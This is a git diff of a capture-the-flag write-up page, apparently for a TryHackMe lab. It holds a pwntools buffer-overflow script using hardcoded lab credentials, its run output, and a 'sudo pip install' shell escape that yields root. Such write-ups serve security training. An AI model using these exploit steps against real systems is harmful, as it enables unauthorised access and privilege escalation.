@@ -155,54 +155,54 @@ Service detection performed. Please report any incorrect results at https://nmap
 <p>Based on the port 80 source code hint given, we can guess that vulnerable point was <strong>store_your_buffer</strong> functionality and the amount of buffer to overflow it most likely will be greater than 1000. After interacting a while with it, the flow to exploit it to get secret directory probably is:</p>
 <pre tabindex="0"><code>Register an account -&gt; Login -&gt; Buffer Overflow on store_your_buffer -&gt; get_secret_directory
 </code></pre><p>I have wrote a script to automate this process:</p>
-<pre tabindex="0"><code>#!/usr/bin/env python3
-
-from pwn import *
-import argparse
-import pdb
-
-parser = argparse.ArgumentParser(description=&#34;BOF Exploit&#34;)
-parser.add_argument(&#34;host&#34;, help=&#34;The host IP address&#34;)
-parser.add_argument(&#34;port&#34;, help=&#34;The host port&#34;)
-args=parser.parse_args()
-
-# Connection
-target = remote(args.host, args.port)
-
-# Registration
-print(&#34;[+] Default hardcoded credential: anonymous:anonymous123&#34;)
-print(&#34;[+] Registering using default hardcoded credential&#34;)
-target.recvuntil(b&#34;store_your_buffer: 4&#34;)
-target.sendline(b&#39;1&#39;)
-target.recvuntil(b&#39;Enter an username:&#39;)
-target.sendline(b&#39;anonymous&#39;)
-target.recvuntil(b&#39;Enter a password:&#39;)
-target.sendline(b&#39;anonymous123&#39;)
-
-# Login
-print(&#34;[+] Loging using registered credential&#34;)
-target.recvuntil(b&#34;store_your_buffer: 4&#34;)
-target.sendline(b&#39;2&#39;)
-target.recvuntil(b&#39;Username:&#39;)
-target.sendline(b&#39;anonymous&#39;)
-target.recvuntil(b&#39;Password:&#39;)
-target.sendline(b&#39;anonymous123&#39;)
-
-# BOF
-print(&#34;[+] Buffer Overflowing &#39;store_your_buffer&#39; functionality&#34;)
-target.recvuntil(b&#34;store_your_buffer: 4&#34;)
-target.sendline(b&#39;4&#39;)
-target.recvuntil(b&#39;Enter your buffer:&#39;)
-buffer = b&#34;A&#34;*1500
-target.sendline(buffer)
-
-# Get secret
-print(&#34;[+] Getting secret directory&#34;)
-target.recvuntil(b&#39;store_your_buffer: 4\r\n&#39;)
-target.sendline(b&#39;3&#39;)
-print(&#34;[*] Success !!!\n&#34;)
-print(target.recvline().decode(&#34;utf-8&#34;))
-</code></pre><p>Basically the script follows the flow i mentioned above and overflow the vulnerable functionality with 1500 bytes. We just need to supply the machine IP and port to execute this exploit.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> argparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pdb
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>parser <span style="color:#f92672">=</span> argparse<span style="color:#f92672">.</span>ArgumentParser(description<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;BOF Exploit&#34;</span>)
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;host&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The host IP address&#34;</span>)
+</span></span><span style="display:flex;"><span>parser<span style="color:#f92672">.</span>add_argument(<span style="color:#e6db74">&#34;port&#34;</span>, help<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;The host port&#34;</span>)
+</span></span><span style="display:flex;"><span>args<span style="color:#f92672">=</span>parser<span style="color:#f92672">.</span>parse_args()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Connection</span>
+</span></span><span style="display:flex;"><span>target <span style="color:#f92672">=</span> remote(args<span style="color:#f92672">.</span>host, args<span style="color:#f92672">.</span>port)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Registration</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Default hardcoded credential: anonymous:anonymous123&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Registering using default hardcoded credential&#34;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;store_your_buffer: 4&#34;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter an username:&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;anonymous&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter a password:&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;anonymous123&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Login</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Loging using registered credential&#34;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;store_your_buffer: 4&#34;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Username:&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;anonymous&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Password:&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;anonymous123&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># BOF</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Buffer Overflowing &#39;store_your_buffer&#39; functionality&#34;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;store_your_buffer: 4&#34;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter your buffer:&#39;</span>)
+</span></span><span style="display:flex;"><span>buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1500</span>
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(buffer)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get secret</span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Getting secret directory&#34;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;store_your_buffer: 4</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>target<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;3&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[*] Success !!!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>print(target<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>Basically the script follows the flow i mentioned above and overflow the vulnerable functionality with 1500 bytes. We just need to supply the machine IP and port to execute this exploit.</p>
 <pre tabindex="0"><code>$ python exploit.py 10.10.107.235 2222
 [+] Opening connection to 10.10.107.235 on port 2222: Done
 [+] Default hardcoded credential: anonymous:anonymous123
@@ -240,10 +240,10 @@ My secret in the port 9090 is: /xxxxx
 <pre tabindex="0"><code>sudo -l
 </code></pre><p><img src="/img/thm-nonamectf/abacfee0f5d6a41063588edd829a7efb.png" alt="IMG8"></p>
 <h3 id="exploit">Exploit</h3>
-<pre tabindex="0"><code>TF=$(mktemp -d)
-echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
-sudo /usr/bin/pip install $TF
-</code></pre><h3 id="rooted-">Rooted !</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>TF<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>mktemp -d<span style="color:#66d9ef">)</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> &gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74"> 2&gt;</span><span style="color:#66d9ef">$(</span>tty<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#39;)&#34;</span> &gt; $TF/setup.py
+</span></span><span style="display:flex;"><span>sudo /usr/bin/pip install $TF
+</span></span></code></pre></div><h3 id="rooted-">Rooted !</h3>
 <p><img src="/img/thm-nonamectf/1ca5eba662366c1f2fcc22fbe8148980.png" alt="IMG9"></p>
 <p>To whoever reading this till here, thank you so much and have a nice day !</p>
 
